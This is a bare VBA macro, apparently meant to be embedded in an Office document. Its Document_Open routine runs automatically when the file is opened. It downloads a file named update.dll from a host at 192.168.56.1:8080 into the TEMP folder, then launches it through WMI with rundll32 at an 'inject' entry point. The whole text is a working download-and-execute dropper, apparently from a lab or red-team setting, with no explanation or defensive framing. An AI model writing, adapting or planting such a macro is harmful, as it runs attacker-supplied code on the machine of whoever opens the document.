Sub downloadFile(url As String, fileOutPath As String)

    Dim WinHttpReq As Object, oStream As Object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", url, False
    WinHttpReq.Send

    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile fileOutPath, 2
        oStream.Close
    End If

End Sub

Sub Document_Open()
    Dim filepath As String
    filepath = Environ("TEMP") & "\update.dll"

    downloadFile "http://192.168.56.1:8080/update.dll", filepath

    Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
    errReturn = objProcess.Create("rundll32.exe " & filepath & ",inject", Null, objConfig, intProcessID)
End Sub
